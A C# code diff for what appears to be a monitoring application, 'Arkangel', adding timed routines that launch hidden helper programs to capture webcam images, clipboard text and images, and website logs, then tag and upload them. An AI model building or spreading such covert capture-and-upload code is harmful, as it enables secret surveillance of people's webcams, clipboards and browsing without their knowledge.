@@ -182,6 +182,21 @@ namespace Arkangel
                 }
             }
         }
+        //ZipWebcam
+        public static void ZipFolderWebsite()
+        {
+            DateTime mydate = DateTime.Now;
+            string date = mydate.ToString("yyyy_MM_dd");
+            using (ZipFile zip = new ZipFile())
+            {
+                if (Directory.Exists(GetpathWU()+"\\Website"))
+                {
+                    zip.AddDirectory(GetpathWU() + "\\Website");
+                    zip.Save(GetpathWU()+"\\"+date +"-"+GetMail()+"-"+Gettoken()+ ".zip");
+                }
+            }
+        }
+
         //Timer for FTP
         public static void SetTimerFTP(int _time)
         {
@@ -239,6 +254,44 @@ namespace Arkangel
             }
             return path;
         }
+        public static string GetpathWebcam()
+        {
+            string path = "";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
+                    SQLiteDataReader data = sqlComm.ExecuteReader();
+                    while (data.Read())
+                    {
+                        path = data["webcamLog"].ToString();
+                    }
+                }
+                connect.Close();
+            }
+            return path;
+        }
+        public static string GetpathWU()
+        {
+            string path = "";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
+                    SQLiteDataReader data = sqlComm.ExecuteReader();
+                    while (data.Read())
+                    {
+                        path = data["websiteLog"].ToString();
+                    }
+                }
+                connect.Close();
+            }
+            return path;
+        }
         public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
         {
             try
@@ -248,16 +301,14 @@ namespace Arkangel
                 start.FileName = "screenshot.exe";
                 start.WindowStyle = ProcessWindowStyle.Hidden;
                 Process.Start(start);
-                
-                
-                DirectoryInfo d = new DirectoryInfo(GetpathScrShot());//Assuming Test is your Folder
+                DirectoryInfo d = new DirectoryInfo(GetpathScrShot()+"\\Screenshot\\");//Assuming Test is your Folder
                 FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
                 foreach (FileInfo file in Files)
                 {
                     List<string> s = new List<string>();
                     s.Add(Gettoken());
-                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s); ;
-                    var jpeg = new JpegMetadataAdapter(GetpathScrShot()+"\\"+file.Name);
+                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s);
+                    var jpeg = new JpegMetadataAdapter(GetpathScrShot()+"\\Screenshot\\"+file.Name);
                     //jpeg.Metadata.Comment = token;
                     jpeg.Metadata.Title = "A title";
                     jpeg.Metadata.Author = autho;
@@ -335,7 +386,67 @@ namespace Arkangel
                 MainWindow.aTimer_webcam.Enabled = true;
             }
             catch { }
-          
+           
+        }
+        public static void SetTimerWebsite(int _time)
+        {
+            try
+            {
+                // Create a timer with a two second interval.
+                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+                // Hook up the Elapsed event for the timer. 
+                MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebsite;
+                MainWindow.aTimer_webcam.AutoReset = true;
+                MainWindow.aTimer_webcam.Enabled = true;
+            }
+            catch { }
+        }
+        public static void OnTimedEventWebsite(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                ZipFolderWebsite();
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upWebsite.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            } 
+            catch { }
+        }
+        public static void SetTimerClipboard(int _time)
+        {
+            try
+            {
+                // Create a timer with a two second interval.
+                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+                // Hook up the Elapsed event for the timer. 
+                MainWindow.aTimer_webcam.Elapsed += OnTimedEventClipboard;
+                MainWindow.aTimer_webcam.AutoReset = true;
+                MainWindow.aTimer_webcam.Enabled = true;
+            }
+            catch { }
+        }
+        public static void OnTimedEventClipboard(Object source, ElapsedEventArgs e)
+        {
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upClipboardImg.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upClipboardText.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
         }
         public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
         {
@@ -346,8 +457,34 @@ namespace Arkangel
                 start.FileName = "webcam.exe";
                 start.WindowStyle = ProcessWindowStyle.Hidden;
                 Process.Start(start);
+
+
+                DirectoryInfo d = new DirectoryInfo(GetpathWebcam() + "\\Webcam\\");//Assuming Test is your Folder
+                FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
+                foreach (FileInfo file in Files)
+                {
+                    List<string> s = new List<string>();
+                    s.Add(Gettoken());
+                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s);
+                    var jpeg = new JpegMetadataAdapter(GetpathWebcam() + "\\Webcam\\" + file.Name);
+                    //jpeg.Metadata.Comment = token;
+                    jpeg.Metadata.Title = "A title";
+                    jpeg.Metadata.Author = autho;
+                    jpeg.Save();
+
+                }
             }
             catch { }
+            try
+            {
+                ProcessStartInfo startupload = new ProcessStartInfo();
+                startupload.WorkingDirectory = @"..\..\module\";
+                startupload.FileName = "upWebcamLog.exe";
+                startupload.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(startupload);
+            }
+            catch { }
+
         }
 
         // Timer for Send mail
@@ -443,7 +580,37 @@ namespace Arkangel
                 }
             }
         }
+        public static void WriteClipboard()
+        {
+            DateTime mydate = DateTime.Now;
+            string date = mydate.ToString("yyyy_MM_dd");
+            string time = mydate.ToString("HH_mm_ss");
+            File.AppendAllText(@"..\\..\\Clipboard\\" + date + "-" + GetMail() + "-" + Gettoken() + ".txt","\n"+time+"\n"+Clipboard.GetText());
 
+            BitmapSource image = null;
+            image = System.Windows.Clipboard.GetImage();
+            if (image != null)
+            {
+                DateTime datetime = DateTime.Now;
+                string alldate = mydate.ToString("yyyy_MM_dd-HH_mm_ss");
+                string name = alldate + " - " + GetMail() + ".jpeg";
+                string filename = System.IO.Path.Combine("..\\..\\Clipboard", name);
+                using (var fileStream = new FileStream(filename, FileMode.Create))
+                {
+                    BitmapEncoder encoder = new JpegBitmapEncoder();
+                    encoder.Frames.Add(BitmapFrame.Create(image));
+                    encoder.Save(fileStream);
+                }
+                List<string> s = new List<string>();
+                s.Add(Gettoken());
+                ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s); ;
+                var jpeg = new JpegMetadataAdapter(filename);
+                //jpeg.Metadata.Comment = token;
+                jpeg.Metadata.Title = "A title";
+                jpeg.Metadata.Author = autho;
+                jpeg.Save();
+            }
+        }
 
         public static string ComputeHash(string plainText, byte[] saltBytes)
         {
